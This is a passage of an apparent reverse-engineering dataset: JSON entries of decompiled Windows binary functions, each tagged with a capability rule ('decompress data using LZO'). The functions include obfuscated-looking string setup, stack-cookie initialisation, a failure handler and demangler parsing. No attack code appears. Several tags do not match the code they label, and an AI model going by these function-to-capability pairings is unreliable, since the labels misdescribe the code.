        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0042924e(uint param_1)\n\n{\n    uint var_11ch;\n    uint var_10ch;\n    uint var_f4h;\n    uint var_d9h;\n    uint var_bdh;\n    uint var_a1h;\n    uint var_88h;\n    uint var_6dh;\n    uint var_51h;\n    uint var_38h;\n    uint var_bp_20h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"vpsaokf\", &var_d9h);\n    fcn.004286e0(param_1, 0x1803, 0, *0x523448, *0x523448 >> 0x20, *0x523440, *0x523440 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ijyjvqdi\", &var_bdh);\n    fcn.004287d0(1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"xiudqcnkcbblqoegbyflcoofhvfodcfzxobbstnchkutijdwlwggmhwrrtmjqllvmxahppapjspj\", &var_a1h);\n    fcn.004287ec(1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ehvqngpkwhgphkyvvdujzjpsivxojwjdofuytxfdztrqtolvmmlbsvujrlnfplorgqinrc\", &var_6dh);\n    fcn.00483110();\n    fcn.004b21e0(\"zyciskuyckkhexsryyarhyycdhwmnomrsahjdckmdvnpoztjmtmmnflmzmztppeavzcuvtmqpybbwyoiozify\", &var_51h);\n    fcn.00428bc8(param_1, &var_6dh + 1, &var_88h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00428c2c(param_1, 0);\n    fcn.004b2800();\n    fcn.00428c8e(param_1, 1, 0);\n    fcn.004b2800();\n    fcn.0042858c(0x1e, *0x523450, *0x523450 >> 0x20);\n    fcn.004283d6(param_1);\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 726
    },
    "0042a4c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0042a4c4(uint param_1)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    uint in_stack_fffffcdc;\n    ulong uVar3;\n    uint in_stack_fffffd30;\n    uint in_stack_fffffdcc;\n    uint var_1ech;\n    uint var_1e0h;\n    uint var_1c5h;\n    uint var_1a9h;\n    uint var_18dh;\n    uint var_171h;\n    uint var_155h;\n    uint var_139h;\n    uint var_11dh;\n    uint var_101h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_5ch;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    uVar3 = CONCAT44(0x42a51c, in_stack_fffffdcc);\n    fcn.004b21e0(\"arxegacnmhtdaclcxpynftwntdbdnjygfagkunhureokwffibrgezhbelujjzduqqaesbyfkkipppoptjcbewodl\", &var_1c5h);\n    fcn.00483110(uVar3);\n    fcn.004b21e0(\"pvwjiknkljjjyixzpirapimjozareyylmrrgrscrcrlibwhfbnflstnlmsucsfnvoaijancbgnxjchiarndew\", &var_1a9h);\n    fcn.00483110();\n    fcn.004b21e0(\"ftdxexqyvhwvtyejscsndhjscbyrnstvphyxzwbopuuui\", &var_18dh);\n    fcn.0042a45a(*0x5234b0, *0x5234b0 >> 0x20, 1, &var_1a9h + 1, *0x5234a8, *0x5234a8 >> 0x20, 0x736, &var_1c5h + 1, 0, \n                 *0x5234a0, *0x5234a0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"kpxzuemacwimpgoptwsrdtuihbdrixoteygasgpgdhdtlhpeidkhvfjdaofrkzygvnbpnuyferddcznrk\", &var_171h);\n    fcn.00483110();\n    fcn.004b21e0(\"bdbmbgbserekfzuoitxtonwkevpejggukgafyrdemwljrguepvpogzyseemnsrkhrlsgagdhkzukxlwoppjkmlouzwnlhrk\", \n                 &var_155h);\n    fcn.00429eca(&var_171h + 1, &var_18dh + 1, 0, 0xa31, *0x5234b8, *0x5234b8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qcuvovdgyswiymndbjucjie\", &var_139h);\n    fcn.0042a20a(&var_155h + 1, 0x1d36, *0x5234c0, *0x5234c0 >> 0x20, 0x11be, 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar3 = CONCAT44(0x42a7bf, in_stack_fffffd30);\n    fcn.004b21e0(\"mfxxcamhcpekkzxpprwycieokieaihkaehhojifye\", &var_11dh);\n    fcn.00483110(uVar3);\n    fcn.004b21e0(0x5213ce, &var_101h);\n    fcn.0042a258(&var_11dh + 1, 0xc6f, *0x5234e0, *0x5234e0 >> 0x20, &var_139h + 1, *0x5234d8, *0x5234d8 >> 0x20, \n                 *0x5234d0, *0x5234d0 >> 0x20, *0x5234c8, *0x5234c8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00429638(*0x5234e8, *0x5234e8 >> 0x20);\n    fcn.00483110();\n    uVar3 = CONCAT44(0x42a8db, in_stack_fffffcdc);\n    fcn.004b21e0(\"punlkuqlfbkmvfpiimrhzyurctrolvdgcfrhairulbrxtitdbldwjoqftebexfzzgiacmjlnuvyzetdfrscerjuiwnlubianicae\"\n                 , &var_e5h);\n    fcn.00483110(uVar3);\n    fcn.004b21e0(\"eghyaqquyfpamvczgkqydethqktsiijxytcgaqidhudkpmllhokb\", &var_c9h);\n    fcn.00429780(&var_e5h + 1, 0, *0x5234f0, *0x5234f0 >> 0x20, 1, 0xfd2, 0x1d80, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00429a0a(0x13b8);\n    fcn.00483110();\n    puVar2 = &var_adh;\n    pcVar1 = \"anablykbzamzpfcioipbyzbiwxvrhgytoxnrljrzvlbvexyeiyivroelcqmanrxsqbyxhuedzpduifoj\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"ktrtlwbrslkdguksqsemmeaikshrgczacetyyloszexgrgdmvlopqtatdlfsboxqxzgxbgmxxorlcdahj\", &var_91h, pcVar1, \n                 puVar2);\n    fcn.00483110();\n    fcn.004b21e0(\"xywobgxmzzhxzuqxpgakhkgcvfzcgimuibxsfkovctxcicvmbpzgrplnanonjbwzbdewpqtjmezmgbbcnufytczkdyhwiqmx\", \n                 &var_75h);\n    fcn.00429a6a(*0x523508, *0x523508 >> 0x20, *0x523500, *0x523500 >> 0x20, &var_91h + 1, *0x5234f8, *0x5234f8 >> 0x20)\n    ;\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wpwxrpddddfvhrwhllpzmlenagklia\", &var_41h);\n    fcn.00483110();\n    fcn.004b21e0(\"qhiwdbureyfvlwgn\", &var_25h);\n    fcn.00483110();\n    fcn.004b21e0(\"grbrbiqlhwnzotlllisbjcqogcimcrplrfmbnfpphrpgfhbfyytcyzgktcncpnjvptdgktzbzjbrulw\", &var_9h);\n    fcn.00429d22(param_1, &var_25h + 1, 0x60f, &var_41h + 1, 0x9b, &var_5ch, 0x4bd, 0x378, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00429ea4(*0x523518, *0x523518 >> 0x20, *0x523510, *0x523510 >> 0x20);\n    return;\n}\n",
        "token_count": 2192
    },
    "0042c6f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0042c6f0(uint param_1)\n\n{\n    char *pcVar1;\n    uint var_33ch;\n    uint var_334h;\n    uint var_31ch;\n    uint var_304h;\n    uint var_2e9h;\n    uint var_2cdh;\n    uint var_2b1h;\n    uint var_295h;\n    uint var_279h;\n    uint var_25dh;\n    uint var_241h;\n    uint var_225h;\n    uint var_20ch;\n    uint var_1f1h;\n    uint var_1d5h;\n    uint var_1bch;\n    uint var_1a1h;\n    uint var_185h;\n    uint var_169h;\n    uint var_14dh;\n    uint var_131h;\n    uint var_115h;\n    uint var_f9h;\n    uint var_ddh;\n    uint var_c1h;\n    uint var_a5h;\n    uint var_89h;\n    uint var_70h;\n    uint var_55h;\n    uint var_39h;\n    uint var_bp_20h;\n    uint var_bp_4h;\n    \n    fcn.0042b86c(0);\n    fcn.0042b8ac(param_1, 0, 1);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0(\"xmmoijaacrqalxbhrziirpammckbyijcxcnogtekvkqcwelygqnu\", &var_2e9h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0042b914(param_1, *0x5235a8, *0x5235a8 >> 0x20, &var_2e9h + 1, 1);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0042ba94();\n    fcn.00483110();\n    fcn.004b21e0(\"oeuhzfxmbafeuwltcaxqjsugkfwsiyoitjuwrawprbwazfvtosqvyko\", &var_2b1h);\n    fcn.0042be1a(&var_2cdh + 1, 0x152c, 0, *0x5235b8, *0x5235b8 >> 0x20, 0xbbe, *0x5235b0, *0x5235b0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"fxmjmtnoffhrylrywtkopctzhkeuumrloxuswbbipyy\", &var_295h);\n    fcn.00483110();\n    fcn.004b21e0(\"wwhplcdxjjmqdsbppdenqskbcxqkpbcpbbk\", &var_279h);\n    fcn.0042be4c(*0x5235c8, *0x5235c8 >> 0x20, &var_295h + 1, &var_2b1h + 1, 1, *0x5235c0, *0x5235c0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"uawspaghpteolhjjcljysnkxjnzsrcciicchnydarfzymntnennrstcfkwzwjofj\", &var_25dh);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0042be80(0x1607, *0x5235d8, *0x5235d8 >> 0x20, 0xf27, &var_25dh + 1, 0, *0x5235d0, *0x5235d0 >> 0x20, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0042c18c();\n    fcn.00483110();\n    fcn.004b21e0(\"wsaequnqhmnpertbet\", &var_225h);\n    fcn.0042c600(0, &var_241h + 1, 0, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mlbcydufoxbuzbukhwyfbuugrmad\", &var_1f1h);\n    fcn.00483110();\n    fcn.004b21e0(\"wfmjjqthzfqdtwltuicwbwttgwwrejbyrbnlicryfqc\", &var_1d5h);\n    fcn.0042b54e(param_1, &var_1f1h + 1, 0x2349, &var_20ch, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0042b62c(param_1, *0x5235e0, *0x5235e0 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ctxtamzqgylteuinhfedktbixtgxwrw\", &var_185h);\n    fcn.00483110();\n    fcn.004b21e0(\"tvzwkiddqbhzfregwwfohoqrzkgz\", &var_169h);\n    fcn.00483110();\n    pcVar1 = \"mvuixpvgwzezjyeoyijsehpmrgvjoepnwldzkgzmojkjywlsjm\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"zirbksvknnqgblkaqranxyxikknwddcoewiaclcfxxzvjehfqowrzbgsnwfcadnkeq\", &var_131h, pcVar1);\n    fcn.00483110();\n    fcn.004b21e0(\"pxeakexqhiqhrvngxojxdopdsbzjvuefsxoavegadwob\", &var_115h);\n    fcn.0042b6d6(0, &var_131h + 1, &var_14dh + 1, 0x769, &var_169h + 1, *0x5235e8, *0x5235e8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"sqlvncehqhtralqfdknixfgzwwelanndprdymfkvwoktelbjogcxbxqkwfvcaucniqytmgxvhkzbhde\", &var_f9h);\n    fcn.00483110();\n    fcn.004b21e0(\"lvdwilvzdcasloyhgngxcodngrmwzumkuvfvwrfeiyovzewycti\", &var_ddh);\n    fcn.00483110();\n    fcn.004b21e0(\"esurakqzorxfruoungkjxpwupsjvybqzgxgjkcymbrypxzbuawghybspzgclivhkazhquhizhzifaydj\", &var_c1h);\n    fcn.00483110();\n    fcn.004b21e0(\"xppwqxuovbgm\", &var_a5h);\n    fcn.00483110();\n    fcn.004b21e0(\"ygwfnbkdvonkcqdraasmcexiaautgwwzkunlvviuyyomybaswcctjx\", &var_89h);\n    fcn.0042b758(&var_a5h + 1, 0, &var_c1h + 1, &var_ddh + 1, &var_f9h + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0042ae0c();\n    fcn.0042ae9a(*0x5235f0, *0x5235f0 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"qjuhnjtunzmwmtwzanwzjitwvcxfsfwmaivomvkcatvnbumfcffqblrmfumffzfudrmkgteteiahm\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"owaqbadnpoolyhhmuklwckdxctyzcyijqvbpxesowqabwuo\", &var_39h);\n    fcn.0042b02a(param_1, &var_55h + 1, &var_70h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0042b0a6(param_1, 0);\n    fcn.004b2800();\n    fcn.0042b376(param_1);\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 2466
    },
    "0042d4e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d4e0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = **(in_EAX + 0xc);\n    if ((cVar1 != 'R') && (cVar1 != 'O')) {\n        return param_2;\n    }\n    iVar3 = *(in_EAX + 0x2c) + 3;\n    if (cVar1 == 'R') {\n        iVar3 = *(in_EAX + 0x2c) + 2;\n    }\n    *(in_EAX + 0x2c) = iVar3;\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    uVar2 = fcn.0042d480(0);\n    return uVar2;\n}\n",
        "token_count": 208
    },
    "0042d650": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0042d650(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    char *pcVar3;\n    bool bVar4;\n    char **in_EAX;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    \n    pcVar3 = *in_EAX;\n    cVar2 = *pcVar3;\n    if (cVar2 == 'n') {\n        pcVar6 = pcVar3 + 1;\n        *in_EAX = pcVar6;\n        cVar2 = pcVar3[1];\n        if (9 < cVar2 - 0x30U) {\n            return 0;\n        }\n        bVar4 = true;\n    }\n    else {\n        if (9 < cVar2 - 0x30U) {\n            return 0;\n        }\n        bVar4 = false;\n        pcVar6 = pcVar3;\n    }\n    iVar5 = cVar2;\n    iVar7 = 0;\n    do {\n        pcVar6 = pcVar6 + 1;\n        *in_EAX = pcVar6;\n        iVar1 = iVar5 + iVar7 * 10;\n        iVar5 = *pcVar6;\n        iVar7 = iVar1 + -0x30;\n        if (9 < *pcVar6 - 0x30U) {\n            if (bVar4) {\n                iVar7 = 0x30 - iVar1;\n            }\n            return iVar7;\n        }\n    } while (iVar7 <= (0x7fffffffU - (iVar5 + -0x30)) / 10);\n    return -1;\n}\n",
        "token_count": 362
    },
    "0042d970": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d970(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar2 = *(in_EAX + 0x28);\n    pcVar3 = *(in_EAX + 0xc);\n    cVar1 = *pcVar3;\n    while (cVar1 == 'B') {\n        *(in_EAX + 0xc) = pcVar3 + 1;\n        uVar4 = fcn.0042d7f0();\n        param_2 = fcn.0042d480(uVar4);\n        pcVar3 = *(in_EAX + 0xc);\n        cVar1 = *pcVar3;\n    }\n    *(in_EAX + 0x28) = uVar2;\n    return param_2;\n}\n",
        "token_count": 204
    },
    "0042d9c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0042d9c0(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint *puVar10;\n    bool bVar11;\n    \n    pcVar2 = *(in_EAX + 0xc);\n    if (*pcVar2 != 'S') {\n        return NULL;\n    }\n    *(in_EAX + 0xc) = pcVar2 + 1;\n    if (pcVar2[1] == '\\0') {\n        cVar4 = '\\0';\ncode_r0x0042d9e5:\n        bVar11 = (*(in_EAX + 8) & 8) != 0;\n        if ((!bVar11) && ((param_2 & 1) != 0)) {\n            bVar11 = **(in_EAX + 0xc) + 0xbdU < 2 || bVar11;\n        }\n        pcVar2 = 0x5259a0;\n        cVar7 = 't';\n        while (cVar4 != cVar7) {\n            pcVar2 = pcVar2 + 0x1c;\n            if (pcVar2 == 0x525a64) {\n                return NULL;\n            }\n            cVar7 = *pcVar2;\n        }\n        iVar5 = *(pcVar2 + 0x14);\n        iVar6 = *(in_EAX + 0x14);\n        iVar1 = *(in_EAX + 0x18);\n        if (iVar5 != 0) {\n            uVar9 = *(pcVar2 + 0x18);\n            if (iVar6 < iVar1) {\n                puVar10 = iVar6 * 0x10 + *(in_EAX + 0x10);\n                puVar10[1] = 0;\n                *(in_EAX + 0x14) = iVar6 + 1;\n                *puVar10 = 0x18;\n                puVar10[2] = iVar5;\n                puVar10[3] = uVar9;\n                iVar6 = iVar6 + 1;\n            }\n            else {\n                puVar10 = NULL;\n            }\n            *(in_EAX + 0x28) = puVar10;\n        }\n        if (bVar11) {\n            uVar9 = *(pcVar2 + 0xc);\n            iVar5 = *(pcVar2 + 0x10);\n        }\n        else {\n            uVar9 = *(pcVar2 + 4);\n            iVar5 = *(pcVar2 + 8);\n        }\n        *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + iVar5;\n        if (iVar6 < iVar1) {\n            puVar10 = iVar6 * 0x10 + *(in_EAX + 0x10);\n            puVar10[1] = 0;\n            *(in_EAX + 0x14) = iVar6 + 1;\n            *puVar10 = 0x18;\n            puVar10[2] = uVar9;\n            puVar10[3] = iVar5;\n        }\n        else {\n            puVar10 = NULL;\n        }\n        if (**(in_EAX + 0xc) == 'B') {\n            puVar10 = fcn.0042d970();\n            if ((puVar10 != NULL) && (iVar5 = *(in_EAX + 0x20),  iVar5 < *(in_EAX + 0x24))) {\n                *(*(in_EAX + 0x1c) + iVar5 * 4) = puVar10;\n                *(in_EAX + 0x20) = iVar5 + 1;\n                return puVar10;\n            }\n            return NULL;\n        }\n        return puVar10;\n    }\n    *(in_EAX + 0xc) = pcVar2 + 2;\n    cVar4 = pcVar2[1];\n    iVar5 = cVar4;\n    if ((cVar4 - 0x30U < 10) || (cVar4 == '_')) {\n        uVar8 = 0;\n        if (cVar4 == '_') {\ncode_r0x0042da58:\n            if (*(in_EAX + 0x20) < uVar8 || *(in_EAX + 0x20) == uVar8) {\n                return NULL;\n            }\n            return *(*(in_EAX + 0x1c) + uVar8 * 4);\n        }\n    }\n    else if (0x19 < cVar4 + 0xbfU) goto code_r0x0042d9e5;\n    uVar8 = 0;\n    if (9 < cVar4 - 0x30U) goto code_r0x0042dabb;\n    do {\n        uVar3 = uVar8;\n        uVar8 = iVar5 + -0x30 + uVar8 * 0x24;\n        while( true ) {\n            if (uVar8 < uVar3) {\n                return NULL;\n            }\n            pcVar2 = *(in_EAX + 0xc);\n            if (*pcVar2 == '\\0') {\n                iVar5 = 0;\n            }\n            else {\n                *(in_EAX + 0xc) = pcVar2 + 1;\n                iVar5 = *pcVar2;\n                if (*pcVar2 == '_') {\n                    uVar8 = uVar8 + 1;\n                    goto code_r0x0042da58;\n                }\n            }\n            if (iVar5 - 0x30U < 10) break;\ncode_r0x0042dabb:\n            if (0x19 < iVar5 + 0xbfU) {\n                return NULL;\n            }\n            uVar3 = uVar8;\n            uVar8 = iVar5 + -0x37 + uVar8 * 0x24;\n        }\n    } while( true );\n}\n",
        "token_count": 1354
    },
    "0042dd40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042dd40(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    \n    if (param_2 == NULL) {\n        return NULL;\n    }\n    do {\n    // switch table (76 cases) at 0x524d80\n        switch(*param_2) {\n        case 0:\n        case 6:\n        case 0x18:\n        case 0x27:\n        case 0x2c:\n        case 0x31:\n        case 0x40:\n        case 0x41:\n        case 0x45:\n        case 0x46:\n        case 0x47:\n        case 0x4a:\n        case 0x4b:\n            goto code_r0x0042dd77;\n        case 5:\n            piVar1 = fcn.0042dd10();\n            if ((piVar1 != NULL) && (*piVar1 == 0x2f)) {\n                return piVar1;\n            }\n            goto code_r0x0042dd77;\n        case 7:\n        case 8:\n        case 0x32:\n            goto code_r0x0042dd6e;\n        }\n        piVar1 = fcn.0042dd40();\n        if (piVar1 != NULL) {\n            return piVar1;\n        }\ncode_r0x0042dd6e:\n        param_2 = param_2[3];\n    } while (param_2 != NULL);\ncode_r0x0042dd77:\n    return NULL;\n}\n",
        "token_count": 346
    },
    "00437040": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00437040(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t auStack40 [6];\n    \n    uStack44 = 0;\n    auStack40[0] = 0;\n    if (*0x517514 != 0xbb40e64e) {\n        *0x517518 = ~*0x517514;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack44);\n    uVar4 = uStack48 ^ uStack44;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(auStack40);\n    *0x517514 = uStack44 ^ uVar4 ^ auStack40[0] ^ uVar1 ^ uVar2 ^ uVar3;\n    if (*0x517514 == 0xbb40e64e) {\n        *0x517518 = 0x44bf19b0;\n        *0x517514 = 0xbb40e64f;\n    }\n    else {\n        *0x517518 = ~*0x517514;\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "004370f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004370f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    \n    *0x56b340 = 0xc0000409;\n    *0x56b344 = 1;\n    *0x56b10c = arg_8h;\n    *0x56b118 = unaff_retaddr;\n    *0x56b124 = *0x10;\n    *0x56b34c = unaff_retaddr;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x526a6c);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    uVar2 = 0xc0000409;\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0xc0000409);\n    sub.msvcrt.dll_abort();\n    if ((iVar1 != 3) && (iVar1 != 0)) {\n        return 1;\n    }\n    fcn.00437a80(0x43716f, iVar1, uVar2);\n    return 1;\n}\n",
        "token_count": 281
    },
    "00437380": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00437538)\n// WARNING: Removing unreachable block (ram,0x00437601)\n// WARNING: Removing unreachable block (ram,0x00437547)\n// WARNING: Removing unreachable block (ram,0x00437685)\n// WARNING: Removing unreachable block (ram,0x00437693)\n// WARNING: Removing unreachable block (ram,0x00437736)\n// WARNING: Removing unreachable block (ram,0x004376a1)\n// WARNING: Removing unreachable block (ram,0x00437606)\n// WARNING: Removing unreachable block (ram,0x0043760e)\n// WARNING: Removing unreachable block (ram,0x00437619)\n// WARNING: Removing unreachable block (ram,0x00437740)\n// WARNING: Removing unreachable block (ram,0x004377b0)\n// WARNING: Removing unreachable block (ram,0x00437801)\n// WARNING: Removing unreachable block (ram,0x0043781a)\n// WARNING: Removing unreachable block (ram,0x004377b7)\n// WARNING: Removing unreachable block (ram,0x004377be)\n// WARNING: Removing unreachable block (ram,0x00437763)\n// WARNING: Removing unreachable block (ram,0x004377c5)\n// WARNING: Removing unreachable block (ram,0x00437885)\n// WARNING: Removing unreachable block (ram,0x004377e2)\n// WARNING: Removing unreachable block (ram,0x00437870)\n// WARNING: Removing unreachable block (ram,0x0043776a)\n// WARNING: Removing unreachable block (ram,0x00437835)\n// WARNING: Removing unreachable block (ram,0x0043783c)\n// WARNING: Removing unreachable block (ram,0x004378a5)\n// WARNING: Removing unreachable block (ram,0x00437855)\n// WARNING: Removing unreachable block (ram,0x00437859)\n// WARNING: Removing unreachable block (ram,0x00437775)\n// WARNING: Removing unreachable block (ram,0x004378be)\n// WARNING: Removing unreachable block (ram,0x00437792)\n// WARNING: Removing unreachable block (ram,0x00437796)\n// WARNING: Removing unreachable block (ram,0x004377ea)\n// WARNING: Removing unreachable block (ram,0x004377f7)\n// WARNING: Removing unreachable block (ram,0x004378e0)\n// WARNING: Removing unreachable block (ram,0x0043787e)\n// WARNING: Removing unreachable block (ram,0x00437625)\n// WARNING: Removing unreachable block (ram,0x00437634)\n// WARNING: Removing unreachable block (ram,0x00437640)\n// WARNING: Removing unreachable block (ram,0x004376b1)\n// WARNING: Removing unreachable block (ram,0x004376ca)\n// WARNING: Removing unreachable block (ram,0x004376cd)\n// WARNING: Removing unreachable block (ram,0x00437663)\n// WARNING: Removing unreachable block (ram,0x00437722)\n// WARNING: Removing unreachable block (ram,0x0043766c)\n// WARNING: Removing unreachable block (ram,0x00437675)\n// WARNING: Removing unreachable block (ram,0x00437700)\n// WARNING: Removing unreachable block (ram,0x0043770e)\n// WARNING: Removing unreachable block (ram,0x00437711)\n// WARNING: Removing unreachable block (ram,0x004376e3)\n// WARNING: Removing unreachable block (ram,0x004376f2)\n// WARNING: Removing unreachable block (ram,0x0043754f)\n// WARNING: Removing unreachable block (ram,0x00437554)\n// WARNING: Removing unreachable block (ram,0x0043755c)\n// WARNING: Removing unreachable block (ram,0x00437583)\n// WARNING: Removing unreachable block (ram,0x004375a8)\n// WARNING: Removing unreachable block (ram,0x004375ab)\n// WARNING: Removing unreachable block (ram,0x004375b9)\n// WARNING: Removing unreachable block (ram,0x004375c2)\n// WARNING: Removing unreachable block (ram,0x004375d4)\n// WARNING: Removing unreachable block (ram,0x004375ee)\n// WARNING: Removing unreachable block (ram,0x004375f9)\n// WARNING: Removing unreachable block (ram,0x00437580)\n\nuint32_t fcn.00437380(void)\n\n{\n    uint32_t in_EAX;\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uchar auStack105 [25];\n    uint uStack80;\n    uint32_t uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint uStack40;\n    uint uStack28;\n    uint32_t uStack20;\n    \n    if (*0x56b3c0 < 1) goto code_r0x00437490;\n    iVar4 = 0;\n    puVar3 = *0x56b3c4 + 0xc;\n    do {\n        if ((*puVar3 <= in_EAX) && (in_EAX < *puVar3 + *(puVar3[1] + 8))) {\n            return in_EAX;\n        }\n        iVar4 = iVar4 + 1;\n        puVar3 = puVar3 + 5;\n        iStack72 = *0x56b3c0;\n    